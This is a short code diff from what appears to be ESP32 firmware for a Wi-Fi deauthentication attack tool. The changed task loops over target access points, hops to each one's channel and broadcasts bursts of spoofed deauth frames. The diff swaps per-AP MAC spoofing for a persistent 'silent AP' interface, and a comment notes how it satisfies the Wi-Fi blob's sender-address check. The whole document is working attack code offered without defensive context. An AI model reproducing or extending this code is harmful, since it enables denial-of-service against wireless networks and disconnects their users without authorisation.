@@ -31,10 +31,11 @@ static void broad_task(void *)
      * blast a burst of deauths, move on. Spoofing per-AP is expensive
      * (stop/set/start) but necessary — each AP has its own BSSID and
      * the blob's sanity check wants addr2 == STA MAC per frame. */
+    wifi_silent_ap_begin(1);
     while (s_b_running) {
         if (s_b_target_n == 0) { delay(100); continue; }
         const db_target_t &t = s_b_targets[s_b_cursor % s_b_target_n];
-        wifi_ap_spoof_begin(t.bssid);
+        /* Hop channel only — the AP interface stays up. */
         esp_wifi_set_channel(t.channel ? t.channel : 1, WIFI_SECOND_CHAN_NONE);
         for (int i = 0; i < 16 && s_b_running; ++i) {
             int ok = wifi_deauth_broadcast(t.bssid, &s_b_seq);
@@ -44,7 +45,7 @@ static void broad_task(void *)
         }
         s_b_cursor++;
     }
-    wifi_ap_spoof_end();
+    wifi_silent_ap_end();
     vTaskDelete(nullptr);
 }
 
